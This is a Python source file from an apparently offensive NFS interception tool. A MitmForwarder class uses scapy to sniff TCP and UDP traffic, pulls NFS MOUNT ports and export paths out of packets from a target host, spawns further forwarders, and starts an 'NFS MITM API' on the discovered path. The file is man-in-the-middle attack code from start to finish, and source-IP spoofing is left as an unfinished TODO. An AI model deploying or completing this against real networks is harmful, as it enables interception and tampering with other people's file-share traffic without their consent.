import _thread

from nfspionage_api import NfspionageApi
from scapy.compat import raw
from scapy.contrib.mount import MOUNT_Call
from scapy.contrib.oncrpc import RPC
from scapy.layers.inet import IP, TCP, UDP
from scapy.sendrecv import sniff, send


def get_protocol(protocol):
    if protocol.lower() == "tcp":
        return TCP
    else:
        return UDP


# @PARAM
# packet        scapy       packet object
# protocol      string      TCP, UDP
# dir           int         0 - no, get dst
#                           1 - yes, get src
def print_ip_addr(packet, protocol='TCP', src=0):
    print("PROT: " + str(protocol) + ", src: " + str(src))
    protocol_scapy = get_protocol(protocol)
    if src == 1:  # src
        res = packet[IP].src
    else:  # dst
        res = packet[IP].dst

    if protocol_scapy in packet:
        print("\t" + protocol + " is in " + str(packet))
        if src == 1:  # src
            res += ":" + str(packet[protocol_scapy].sport)
        else:  # dst
            res += ":" + str(packet[protocol_scapy].dport)
    return res


class MitmForwarder:
    mount_ports = []
    spoof_address = None

    def __init__(self, remote_ip, port, udp=False):
        print("// ========================================")
        print("// Starting MitmForwarder...")
        print("// [*] LOC Addr:\t127.0.0.1:" + str(port))
        print("// [*] REM Addr:\t" + remote_ip + ":" + str(port))
        if udp:
            print("// [*] PROT:\t\tUDP")
            self.packet_listen(remote_ip, port, protocol="UDP")
        else:
            print("// [*] PROT:\t\tTCP")
            self.packet_listen(remote_ip, port, protocol="TCP")
        print("// ========================================")

    # ==================== PACKET FORWARDING ==================== #

    # create tcp servers to listen for and forward connections to target
    def packet_listen(self, target_host, target_port, protocol="TCP"):
        packet_filter = str(protocol).lower() + " and port " + str(target_port)
        while True:
            print("=========================================")
            packets = sniff(count=1, filter=packet_filter)
            packet = packets.res[0]
            print("PACKET: " + str(packet))
            if packet[IP].src != target_host:  # packet is NOT from target host, change src IP
                # TODO change src ip
                # packet[IP].src = client_address  # how to get client address?
                pass
            else:  # packets is from target host, filter for possible information
                self.filter_packets(str(packet), packet[IP].dst)
            print("[+ " + protocol + " ] " + print_ip_addr(packet, src=1) + " >>> " + print_ip_addr(packet) + " [" + str(len(packet)) + "]")
            send(packet)

    # ==================== PACKET FILTERING ==================== #

    # filter packets for data of interest - i.e., mount port and mount path
    def filter_packets(self, data, remote_ip):
        port = self.filter_mount_port(data)
        if port != -1 and port not in self.mount_ports:
            print("[* INF ] starting forwarders on port " + str(port))
            _thread.start_new_thread(MitmForwarder, (remote_ip, port))
            _thread.start_new_thread(MitmForwarder, (remote_ip, port, True))
            self.mount_ports.append(port)

        # filter path, start mitm API
        path = self.filter_mount_path(data)
        if path != -1:
            print("[* INF ] starting NFS MITM API on path \'" + path + "\'")
            _thread.start_new_thread(NfspionageApi, (remote_ip, path))

    @staticmethod
    def filter_mount_port(data):
        try:  # get port number from last few bytes
            sz = len(data)
            x = data[sz - 2:sz]
            tmp = x.hex()
            port = int(tmp, 16)

            if port != 0 and port > 100:
                print("[* INF ] MOUNT on port " + str(port))
                return port
            else:
                return -1
        except Exception as e:  # error getting mount port
            str("[- EXP ] " + str(e))
            return -1

    @staticmethod
    def filter_mount_path(data):
        try:  # try to convert to MOUNT_Call packet
            mnt_pckt = RPC(MOUNT_Call(raw(data)))
            path = mnt_pckt.path.path.decode('utf-8')
            print("[* INF ] MOUNT on path " + path)
            return path
        except Exception as e:  # error getting mount path
            print("[- EXP ] " + str(e))
            return -1

